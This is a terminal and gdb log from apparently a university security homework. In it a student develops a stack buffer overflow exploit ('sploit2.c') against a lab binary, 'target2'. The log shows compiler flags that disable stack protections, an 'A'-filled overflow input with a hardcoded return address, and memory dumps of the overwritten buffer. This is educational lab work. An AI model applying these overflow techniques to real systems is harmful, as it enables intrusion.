student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb sploit2.c -o sploit2
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit2
Reading symbols from sploit2...done.
(gdb) b 43
No line 43 in the current file.
Make breakpoint pending on future shared library load? (y or [n]) n
(gdb) break main
Breakpoint 1 at 0x804856c: file sploit2.c, line 22.
(gdb) n
The program is not being run.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit2 

Breakpoint 1, main () at sploit2.c:22
22	{
(gdb) b 43
No line 43 in the current file.
Make breakpoint pending on future shared library load? (y or [n]) bn
Please answer y or [n].
Make breakpoint pending on future shared library load? (y or [n]) n
(gdb) break 43
No line 43 in the current file.
Make breakpoint pending on future shared library load? (y or [n]) n
(gdb) n
26	  char *noop = "A";
(gdb) b 37
Breakpoint 2 at 0x80485e4: file sploit2.c, line 37.
(gdb) set follow-fork-mode child
(gdb) n
27	  int sled_length = 399;
(gdb) n
28	  char *address = "\x9f\xff\xff\xbf";
(gdb) n
29	  char *result = malloc(sizeof(noop)*sled_length + 1);
(gdb) n
30	  char *result1 = repeat(noop, sled_length);
(gdb) n
31	  strcat(result, result1);
(gdb) n
32	  args[0] = TARGET;
(gdb) n
33	  args[1] = result;
(gdb) n
34	  args[2] = "399";
(gdb) info frame
Stack level 0, frame at 0xbffff5c0:
 eip = 0x80485d6 in main (sploit2.c:34); saved eip = 0xb7e21637
 source language c.
 Arglist at 0xbffff5a8, args: 
 Locals at 0xbffff5a8, Previous frame's sp is 0xbffff5c0
 Saved registers:
  ebp at 0xbffff5a8, eip at 0xbffff5bc
(gdb) n
36	  env[0] = NULL;
(gdb) n

Breakpoint 2, main () at sploit2.c:37
37	  execve(TARGET, args, env);
(gdb) set follow-fork-mode child
(gdb) p/x TARGET
No symbol "TARGET" in current context.
(gdb) p/x p TARGET
No symbol "p" in current context.
(gdb) n
38	  fprintf(stderr, "execve failed.\n");
(gdb) n
execve failed.
40	  return 0;
(gdb) n
41	}
(gdb) n
__libc_start_main (main=0x804855b <main>, argc=1, argv=0xbffff654, init=0x8048640 <__libc_csu_init>, 
    fini=0x80486a0 <__libc_csu_fini>, rtld_fini=0xb7fea880 <_dl_fini>, stack_end=0xbffff64c)
    at ../csu/libc-start.c:325
325	../csu/libc-start.c: No such file or directory.
(gdb) n
[Inferior 1 (process 1702) exited normally]
(gdb) n
The program is not being run.
(gdb) q
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector sploit2.c -o sploit2
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit2
Reading symbols from sploit2...done.
(gdb) break main
Breakpoint 1 at 0x804850b: file sploit2.c, line 26.
(gdb) set follow-fork-mode child
(gdb) n
The program is not being run.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit2 

Breakpoint 1, main () at sploit2.c:26
26	  char *noop = "A";
(gdb) set follow-fork-mode child
(gdb) n
27	  int sled_length = 399;
(gdb) n
28	  char *address = "\x9f\xff\xff\xbf";
(gdb) n
29	  char *result = malloc(sizeof(noop)*sled_length + 1);
(gdb) n
30	  char *result1 = repeat(noop, sled_length);
(gdb) n
31	  strcat(result, result1);
(gdb) n
32	  args[0] = TARGET;
(gdb) b 37
Breakpoint 2 at 0x804856f: file sploit2.c, line 37.
(gdb) n
33	  args[1] = result;
(gdb) break greeting
Function "greeting" not defined.
Make breakpoint pending on future shared library load? (y or [n]) y
Breakpoint 3 (greeting) pending.
(gdb) n
34	  args[2] = "399";
(gdb) n
36	  env[0] = NULL;
(gdb) n

Breakpoint 2, main () at sploit2.c:37
37	  execve(TARGET, args, env);
(gdb) s
execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) s
__syscall_error (error=-14) at ../sysdeps/unix/sysv/linux/i386/sysdep.c:27
27	../sysdeps/unix/sysv/linux/i386/sysdep.c: No such file or directory.
(gdb) s
__x86.get_pc_thunk.dx () at ../sysdeps/i386/fpu/s_frexp.S:58
58	../sysdeps/i386/fpu/s_frexp.S: No such file or directory.
(gdb) s
__syscall_error (error=-14) at ../sysdeps/unix/sysv/linux/i386/sysdep.c:28
28	../sysdeps/unix/sysv/linux/i386/sysdep.c: No such file or directory.
(gdb) s
30	in ../sysdeps/unix/sysv/linux/i386/sysdep.c
(gdb) s
main () at sploit2.c:38
38	  fprintf(stderr, "execve failed.\n");
(gdb) s
__GI__IO_fwrite (buf=0x8048648, size=1, count=15, fp=0xb7fbbcc0 <_IO_2_1_stderr_>) at iofwrite.c:32
32	iofwrite.c: No such file or directory.
(gdb) s
31	in iofwrite.c
(gdb) s
32	in iofwrite.c
(gdb) s
35	in iofwrite.c
(gdb) s
37	in iofwrite.c
(gdb) nnn
Undefined command: "nnn".  Try "help".
(gdb) n
38	in iofwrite.c
(gdb) exit
Undefined command: "exit".  Try "help".
(gdb) q
A debugging session is active.

	Inferior 1 [process 1723] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit2
Reading symbols from sploit2...done.
(gdb) b 23
Breakpoint 1 at 0x804850b: file sploit2.c, line 23.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit2 

Breakpoint 1, main () at sploit2.c:26
26	  char *noop = "A";
(gdb) q
A debugging session is active.

	Inferior 1 [process 1730] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector sploit2.c -o sploit2
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit2
Reading symbols from sploit2...done.
(gdb) break main
Breakpoint 1 at 0x8048471: file sploit2.c, line 15.
(gdb) n
The program is not being run.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit2 

Breakpoint 1, main () at sploit2.c:15
15	  args[0] = TARGET;
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) n
16	  args[1] = "student"; 
(gdb) n
17	  args[2] = NULL;
(gdb) n
19	  env[0] = NULL;
(gdb) n
20	  execve(TARGET, args, env);
(gdb) n

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 1774 is executing new program: /tmp/target2

Breakpoint 1, main (argc=2, argv=0xbffffef4) at target2.c:22
22	  int real_size = 0;
(gdb) n
23	  int input_size = 0;
(gdb) n
25	  if(argc != 3 )
(gdb) n
27	    fprintf(stderr, "meet: argc != 3\n");
(gdb) n
meet: argc != 3
28	    exit(EXIT_FAILURE);
(gdb) n
[Inferior 1 (process 1774) exited with code 01]
(gdb) n
The program is not being run.
(gdb) n
The program is not being run.
(gdb) n
The program is not being run.
(gdb) q
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector sploit2.c -o sploit2
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit2
Reading symbols from sploit2...done.
(gdb) break main
Breakpoint 1 at 0x804850b: file sploit2.c, line 26.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit2 

Breakpoint 1, main () at sploit2.c:26
26	  args[0] = TARGET;
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) continue
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 1817 is executing new program: /tmp/target2

Breakpoint 1, main (argc=2, argv=0xbffffef4) at target2.c:22
22	  int real_size = 0;
(gdb) q
A debugging session is active.

	Inferior 1 [process 1817] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector sploit2.c -o sploit2
sploit2.c: In function ‘main’:
sploit2.c:29:26: error: ‘noop’ undeclared (first use in this function)
   char *result1 = repeat(noop, sled_length);
                          ^
sploit2.c:29:26: note: each undeclared identifier is reported only once for each function it appears in
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector sploit2.c -o sploit2
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit2
Reading symbols from sploit2...done.
(gdb) break main
Breakpoint 1 at 0x804850b: file sploit2.c, line 26.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit2 

Breakpoint 1, main () at sploit2.c:26
26	  char *c = "A";
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) continue
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
__syscall_error (error=-14) at ../sysdeps/unix/sysv/linux/i386/sysdep.c:27
27	../sysdeps/unix/sysv/linux/i386/sysdep.c: No such file or directory.
(gdb) n
28	in ../sysdeps/unix/sysv/linux/i386/sysdep.c
(gdb) n
30	in ../sysdeps/unix/sysv/linux/i386/sysdep.c
(gdb) n
main () at sploit2.c:38
38	  fprintf(stderr, "execve failed.\n");
(gdb) n
execve failed.
40	  return 0;
(gdb) n
41	}
(gdb) n
__libc_start_main (main=0x8048505 <main>, argc=1, argv=0xbffff654, init=0x80485a0 <__libc_csu_init>, 
    fini=0x8048600 <__libc_csu_fini>, rtld_fini=0xb7fea880 <_dl_fini>, stack_end=0xbffff64c)
    at ../csu/libc-start.c:325
325	../csu/libc-start.c: No such file or directory.
(gdb) n
[Inferior 1 (process 1894) exited normally]
(gdb) n
The program is not being run.
(gdb) n
The program is not being run.
(gdb) q
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector sploit2.c -o sploit2
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit2
Reading symbols from sploit2...done.
(gdb) break main
Breakpoint 1 at 0x804850b: file sploit2.c, line 26.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit2 

Breakpoint 1, main () at sploit2.c:26
26	  char *noop = "A";
(gdb) set follow-fork-mode child
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) n
27	  int sled_length = 8;
(gdb) continue
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 1938 is executing new program: /tmp/target2

Breakpoint 1, main (argc=2, argv=0xbffffef4) at target2.c:22
22	  int real_size = 0;
(gdb) info frame
Stack level 0, frame at 0xbffffe60:
 eip = 0x8048590 in main (target2.c:22); saved eip = 0xb7e21637
 source language c.
 Arglist at 0xbffffe58, args: argc=2, argv=0xbffffef4
 Locals at 0xbffffe58, Previous frame's sp is 0xbffffe60
 Saved registers:
  ebp at 0xbffffe58, eip at 0xbffffe5c
(gdb) n
23	  int input_size = 0;
(gdb) n
25	  if(argc != 3 )
(gdb) n
27	    fprintf(stderr, "meet: argc != 3\n");
(gdb) n
meet: argc != 3
28	    exit(EXIT_FAILURE);
(gdb) n
[Inferior 1 (process 1938) exited with code 01]
(gdb) n
The program is not being run.
(gdb) n
The program is not being run.
(gdb) q
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector sploit2.c -o sploit2
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit2
Reading symbols from sploit2...done.
(gdb) break main
Breakpoint 1 at 0x804850b: file sploit2.c, line 26.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit2 

Breakpoint 1, main () at sploit2.c:26
26	  char *noop = "A";
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) continue
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 1982 is executing new program: /tmp/target2

Breakpoint 1, main (argc=2, argv=0xbffffef4) at target2.c:22
22	  int real_size = 0;
(gdb) q
A debugging session is active.

	Inferior 1 [process 1982] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector sploit2.c -o sploit2
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit2
Reading symbols from sploit2...done.
(gdb) break main
Breakpoint 1 at 0x804850b: file sploit2.c, line 26.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit2 

Breakpoint 1, main () at sploit2.c:26
26	  char *noop = "A";
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) continue
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
__syscall_error (error=-14) at ../sysdeps/unix/sysv/linux/i386/sysdep.c:27
27	../sysdeps/unix/sysv/linux/i386/sysdep.c: No such file or directory.
(gdb) n
28	in ../sysdeps/unix/sysv/linux/i386/sysdep.c
(gdb) n
30	in ../sysdeps/unix/sysv/linux/i386/sysdep.c
(gdb) q
A debugging session is active.

	Inferior 1 [process 2025] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector sploit2.c -o sploit2
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit2
Reading symbols from sploit2...done.
(gdb) break main
Breakpoint 1 at 0x804850b: file sploit2.c, line 26.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit2 

Breakpoint 1, main () at sploit2.c:26
26	  char *noop = "A";
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) continue
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 2068 is executing new program: /tmp/target2

Breakpoint 1, main (argc=2, argv=0xbffffef4) at target2.c:22
22	  int real_size = 0;
(gdb) q
A debugging session is active.

	Inferior 1 [process 2068] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector sploit2.c -o sploit2
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit2
Reading symbols from sploit2...done.
(gdb) break main
Breakpoint 1 at 0x804850b: file sploit2.c, line 26.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit2 

Breakpoint 1, main () at sploit2.c:26
26	  char *noop = "A";
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) continue
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
__syscall_error (error=-14) at ../sysdeps/unix/sysv/linux/i386/sysdep.c:27
27	../sysdeps/unix/sysv/linux/i386/sysdep.c: No such file or directory.
(gdb) n
28	in ../sysdeps/unix/sysv/linux/i386/sysdep.c
(gdb) n
30	in ../sysdeps/unix/sysv/linux/i386/sysdep.c
(gdb) n
main () at sploit2.c:35
35	  fprintf(stderr, "execve failed.\n");
(gdb) n
execve failed.
37	  return 0;
(gdb) n
38	}
(gdb) n
__libc_start_main (main=0x8048505 <main>, argc=1, argv=0xbffff654, init=0x8048570 <__libc_csu_init>, 
    fini=0x80485d0 <__libc_csu_fini>, rtld_fini=0xb7fea880 <_dl_fini>, stack_end=0xbffff64c)
    at ../csu/libc-start.c:325
325	../csu/libc-start.c: No such file or directory.
(gdb) n
[Inferior 1 (process 2111) exited normally]
(gdb) n
The program is not being run.
(gdb) n
The program is not being run.
(gdb) n
The program is not being run.
(gdb) q
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector sploit2.c -o sploit2
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit2
Reading symbols from sploit2...done.
(gdb) break main
Breakpoint 1 at 0x804850b: file sploit2.c, line 26.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit2 

Breakpoint 1, main () at sploit2.c:26
26	  char *noop = "A";
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) continue
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 2154 is executing new program: /tmp/target2

Breakpoint 1, main (argc=3, argv=0xbffffef4) at target2.c:22
22	  int real_size = 0;
(gdb) q
A debugging session is active.

	Inferior 1 [process 2154] will be killed.

Quit anyway? (y or n) y
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gcc -ggdb -mpreferred-stack-boundary=2 -zexecstack -fno-stack-protector sploit2.c -o sploit2
student@5435-hw4-vm:~/cs5435-fa19-hw4/sploits$ gdb -q sploit2
Reading symbols from sploit2...done.
(gdb) break main
Breakpoint 1 at 0x804850b: file sploit2.c, line 26.
(gdb) run
Starting program: /home/student/cs5435-fa19-hw4/sploits/sploit2 

Breakpoint 1, main () at sploit2.c:26
26	  char *noop = "A";
(gdb) set follow-fork-mode child
(gdb) break execve
Breakpoint 2 at 0xb7eb97e0: file ../sysdeps/unix/syscall-template.S, line 84.
(gdb) continue
Continuing.

Breakpoint 2, execve () at ../sysdeps/unix/syscall-template.S:84
84	../sysdeps/unix/syscall-template.S: No such file or directory.
(gdb) n
process 2367 is executing new program: /tmp/target2

Breakpoint 1, main (argc=3, argv=0xbffffd64) at target2.c:22
22	  int real_size = 0;
(gdb) b 15
Breakpoint 3 at 0x8048562: file target2.c, line 15.
(gdb) n
23	  int input_size = 0;
(gdb) n
25	  if(argc != 3 )
(gdb) n
31	  real_size = strlen(argv[1]);
(gdb) n
32	  input_size = atoi(argv[2]);
(gdb) n
33	  printf("input_size=%d",input_size);
(gdb) n
34	  if( real_size > input_size ) 
(gdb) n
40	  greeting( argv[1], input_size );
(gdb) n

Breakpoint 3, greeting (temp1=0xbffffe5b 'A' <repeats 200 times>..., input_size=399) at target2.c:15
15	  strcpy(name, temp1);
(gdb) info frame
Stack level 0, frame at 0xbffffcb8:
 eip = 0x8048562 in greeting (target2.c:15); saved eip = 0x8048635
 called by frame at 0xbffffcd0
 source language c.
 Arglist at 0xbffffcb0, args: temp1=0xbffffe5b 'A' <repeats 200 times>..., input_size=399
 Locals at 0xbffffcb0, Previous frame's sp is 0xbffffcb8
 Saved registers:
  ebp at 0xbffffcb0, eip at 0xbffffcb4
(gdb) x/64x 0xbffffcb4-32
0xbffffc94:	0xb7e52696	0xb7fbbd60	0x08048713	0xbffffcc0
0xbffffca4:	0xb7e52670	0x0000018f	0xb7fff918	0xbffffcc8
0xbffffcb4:	0x08048635	0xbffffe5b	0x0000018f	0x0000018f
0xbffffcc4:	0x0000018f	0x00000000	0xb7e21637	0x00000003
0xbffffcd4:	0xbffffd64	0xbffffd74	0x00000000	0x00000000
0xbffffce4:	0x00000000	0xb7fbb000	0xb7fffc04	0xb7fff000
0xbffffcf4:	0x00000000	0xb7fbb000	0xb7fbb000	0x00000000
0xbffffd04:	0x3311f42c	0x08c3ba3c	0x00000000	0x00000000
0xbffffd14:	0x00000000	0x00000003	0x08048430	0x00000000
0xbffffd24:	0xb7ff0010	0xb7fea880	0xb7fff000	0x00000003
0xbffffd34:	0x08048430	0x00000000	0x08048451	0x0804858a
0xbffffd44:	0x00000003	0xbffffd64	0x08048660	0x080486c0
0xbffffd54:	0xb7fea880	0xbffffd5c	0xb7fff918	0x00000003
0xbffffd64:	0xbffffe4e	0xbffffe5b	0xbfffffeb	0x00000000
0xbffffd74:	0x00000000	0x00000020	0xb7fd9cec	0x00000021
0xbffffd84:	0xb7fd9000	0x00000010	0x178bfbff	0x00000006
(gdb) x/64x 0xbffffcb4-64
0xbffffc74:	0x3939330a	0x00000000	0xb7e0f798	0xb7e4b0cb
0xbffffc84:	0x00000000	0xb7fbb000	0xb7fbb000	0xbffffcc8
0xbffffc94:	0xb7e52696	0xb7fbbd60	0x08048713	0xbffffcc0
0xbffffca4:	0xb7e52670	0x0000018f	0xb7fff918	0xbffffcc8
0xbffffcb4:	0x08048635	0xbffffe5b	0x0000018f	0x0000018f
0xbffffcc4:	0x0000018f	0x00000000	0xb7e21637	0x00000003
0xbffffcd4:	0xbffffd64	0xbffffd74	0x00000000	0x00000000
0xbffffce4:	0x00000000	0xb7fbb000	0xb7fffc04	0xb7fff000
0xbffffcf4:	0x00000000	0xb7fbb000	0xb7fbb000	0x00000000
0xbffffd04:	0x3311f42c	0x08c3ba3c	0x00000000	0x00000000
0xbffffd14:	0x00000000	0x00000003	0x08048430	0x00000000
0xbffffd24:	0xb7ff0010	0xb7fea880	0xb7fff000	0x00000003
0xbffffd34:	0x08048430	0x00000000	0x08048451	0x0804858a
0xbffffd44:	0x00000003	0xbffffd64	0x08048660	0x080486c0
0xbffffd54:	0xb7fea880	0xbffffd5c	0xb7fff918	0x00000003
0xbffffd64:	0xbffffe4e	0xbffffe5b	0xbfffffeb	0x00000000
(gdb) x/64x 0xbffffcb4-128
0xbffffc34:	0xb7fff918	0x0804a00c	0xb7fe98a2	0xb7fffad0
0xbffffc44:	0xb7fd54a0	0x00000001	0x00000001	0x00000000
0xbffffc54:	0xb7e390b9	0x00000000	0xb7fbb000	0xb7fbb000
0xbffffc64:	0xbffffcc8	0xb7fff000	0x08048280	0x00000000
0xbffffc74:	0x3939330a	0x00000000	0xb7e0f798	0xb7e4b0cb
0xbffffc84:	0x00000000	0xb7fbb000	0xb7fbb000	0xbffffcc8
0xbffffc94:	0xb7e52696	0xb7fbbd60	0x08048713	0xbffffcc0
0xbffffca4:	0xb7e52670	0x0000018f	0xb7fff918	0xbffffcc8
0xbffffcb4:	0x08048635	0xbffffe5b	0x0000018f	0x0000018f
0xbffffcc4:	0x0000018f	0x00000000	0xb7e21637	0x00000003
0xbffffcd4:	0xbffffd64	0xbffffd74	0x00000000	0x00000000
0xbffffce4:	0x00000000	0xb7fbb000	0xb7fffc04	0xb7fff000
0xbffffcf4:	0x00000000	0xb7fbb000	0xb7fbb000	0x00000000
0xbffffd04:	0x3311f42c	0x08c3ba3c	0x00000000	0x00000000
0xbffffd14:	0x00000000	0x00000003	0x08048430	0x00000000
0xbffffd24:	0xb7ff0010	0xb7fea880	0xb7fff000	0x00000003
(gdb) n
16	  printf( "Hi %s\n", name );
(gdb) x/64x 0xbffffcb4-128
0xbffffc34:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc44:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc54:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc64:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc74:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc84:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc94:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffca4:	0x41414141	0x41414141	0x00414141	0xbffffcc8
0xbffffcb4:	0x08048635	0xbffffe5b	0x0000018f	0x0000018f
0xbffffcc4:	0x0000018f	0x00000000	0xb7e21637	0x00000003
0xbffffcd4:	0xbffffd64	0xbffffd74	0x00000000	0x00000000
0xbffffce4:	0x00000000	0xb7fbb000	0xb7fffc04	0xb7fff000
0xbffffcf4:	0x00000000	0xb7fbb000	0xb7fbb000	0x00000000
0xbffffd04:	0x3311f42c	0x08c3ba3c	0x00000000	0x00000000
0xbffffd14:	0x00000000	0x00000003	0x08048430	0x00000000
0xbffffd24:	0xb7ff0010	0xb7fea880	0xb7fff000	0x00000003
(gdb) n
input_size=399Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
17	}
(gdb) x/64x 0xbffffcb4-128
0xbffffc34:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc44:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc54:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc64:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc74:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc84:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc94:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffca4:	0x41414141	0x41414141	0x00414141	0xbffffcc8
0xbffffcb4:	0x08048635	0xbffffe5b	0x0000018f	0x0000018f
0xbffffcc4:	0x0000018f	0x00000000	0xb7e21637	0x00000003
0xbffffcd4:	0xbffffd64	0xbffffd74	0x00000000	0x00000000
0xbffffce4:	0x00000000	0xb7fbb000	0xb7fffc04	0xb7fff000
0xbffffcf4:	0x00000000	0xb7fbb000	0xb7fbb000	0x00000000
0xbffffd04:	0x3311f42c	0x08c3ba3c	0x00000000	0x00000000
0xbffffd14:	0x00000000	0x00000003	0x08048430	0x00000000
0xbffffd24:	0xb7ff0010	0xb7fea880	0xb7fff000	0x00000003
(gdb) n
main (argc=3, argv=0xbffffd64) at target2.c:41
41	  printf( "Bye %s\n", argv[1] );
(gdb) info frame
Stack level 0, frame at 0xbffffcd0:
 eip = 0x8048638 in main (target2.c:41); saved eip = 0xb7e21637
 source language c.
 Arglist at 0xbffffcc8, args: argc=3, argv=0xbffffd64
 Locals at 0xbffffcc8, Previous frame's sp is 0xbffffcd0
 Saved registers:
  ebp at 0xbffffcc8, eip at 0xbffffccc
(gdb) x/64x 0xbffffccc-64
0xbffffc8c:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffc9c:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffffcac:	0x00414141	0xbffffcc8	0x08048635	0xbffffe5b
0xbffffcbc:	0x0000018f	0x0000018f	0x0000018f	0x00000000
0xbffffccc:	0xb7e21637	0x00000003	0xbffffd64	0xbffffd74
0xbffffcdc:	0x00000000	0x00000000	0x00000000	0xb7fbb000
0xbffffcec:	0xb7fffc04	0xb7fff000	0x00000000	0xb7fbb000
0xbffffcfc:	0xb7fbb000	0x00000000	0x3311f42c	0x08c3ba3c
0xbffffd0c:	0x00000000	0x00000000	0x00000000	0x00000003
0xbffffd1c:	0x08048430	0x00000000	0xb7ff0010	0xb7fea880
0xbffffd2c:	0xb7fff000	0x00000003	0x08048430	0x00000000
0xbffffd3c:	0x08048451	0x0804858a	0x00000003	0xbffffd64
0xbffffd4c:	0x08048660	0x080486c0	0xb7fea880	0xbffffd5c
0xbffffd5c:	0xb7fff918	0x00000003	0xbffffe4e	0xbffffe5b
0xbffffd6c:	0xbfffffeb	0x00000000	0x00000000	0x00000020
0xbffffd7c:	0xb7fd9cec	0x00000021	0xb7fd9000	0x00000010
(gdb) n
Bye AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
42	  return 0;
(gdb) n
43	}
(gdb) n
__libc_start_main (main=0x804858a <main>, argc=3, argv=0xbffffd64, init=0x8048660 <__libc_csu_init>, 
    fini=0x80486c0 <__libc_csu_fini>, rtld_fini=0xb7fea880 <_dl_fini>, stack_end=0xbffffd5c)
    at ../csu/libc-start.c:325
